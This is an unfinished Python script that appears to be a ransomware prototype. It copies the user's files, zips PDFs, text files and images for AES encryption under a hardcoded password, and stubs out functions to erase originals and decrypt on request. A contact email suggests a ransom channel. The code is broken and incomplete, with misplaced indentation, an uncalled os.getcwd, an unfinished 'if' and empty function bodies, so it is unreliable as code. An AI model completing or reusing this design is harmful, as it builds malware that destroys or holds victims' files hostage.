#!$HOME/anaconda3/bin/python

#==========LIBRARIES==========#
import zipfile
import pyAesCrypt
import os
import shutil

#==========VARIABLES==========#
mail="young_administration@drugsforlive.com"

#==========FUNCTIONS==========#
#==========ENCRYPT FILES==========#
def copy2file():
    initial_path=os.getcwd() # define source path
    target_folder=os.path.join(os.path.expanduser("~"),"Desktop") # remeber use the loop for look that paths!
    for I in os.listdir(initial_path): # change iterbale path
        source_file=os.path.join(initial_path,I)
        if os.path.isfile(source_file):
            shutil.copy(source_file,target_folder)
#end of functions, test in so windows system!!

def encrypt2file():
    zip_file_name='encrypt_files' # name to compress files
    password='password'
    if os.path.exists(zip_file_name+'.aes'):
        print('\nDO NOT EXECUTE AGAIN THIS FILE')
        return # perhaps 0 or 1 to exit control_structure

zip_file=zipfile.ZipFile(zip_file_name+'.zip','w',zipfile.ZIP_DEFLATED)

for I in os.listdir(os.getcwd):
    ext_file=os.path.splitext(I)[1]
    if ext_file in ['.pdf', '.txt', '.jpg']:
        zip_file.write(I)
zip_file.close()
    

def erase2files():
    for files in os.listdir(): # all files in loop
        if # search i don't remember this structure
            pass

#==========DECRYPT FILES==========#
def decrypt_unzip():
    while True:
        # password
        # control_structure

